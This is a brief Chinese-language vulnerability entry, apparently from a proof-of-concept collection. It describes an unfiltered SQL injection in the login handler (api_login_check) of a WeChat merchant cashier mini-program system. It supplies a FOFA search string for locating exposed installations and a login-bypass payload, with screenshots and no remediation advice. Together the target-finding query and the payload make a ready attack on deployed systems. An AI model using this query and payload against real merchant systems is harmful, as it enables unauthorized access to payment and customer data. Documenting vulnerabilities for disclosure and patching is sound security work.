# 微信公众号商家收银台小程序系统存在前台SQL注入漏洞

微信公众号商家收银台小程序系统存在前台SQL注入漏洞，/system/platform/controller/index.php 登录控制器中的api_login_check 方法，通过POST传入username,password,code 三个参数之后直接进入到SQL查询中，且未有任何过滤，导致漏洞产生。

## fofa

```javascript
"/index.php?s=platform/index/captcha"
```

## poc

```javascript
1' OR 1=1 OR '1'='1
```

![d1c295315cc728f91214a29ba6a8c463](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411141432533.jpg)

![98204052f465039cbf5a08afb6382c71](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411141432078.jpg)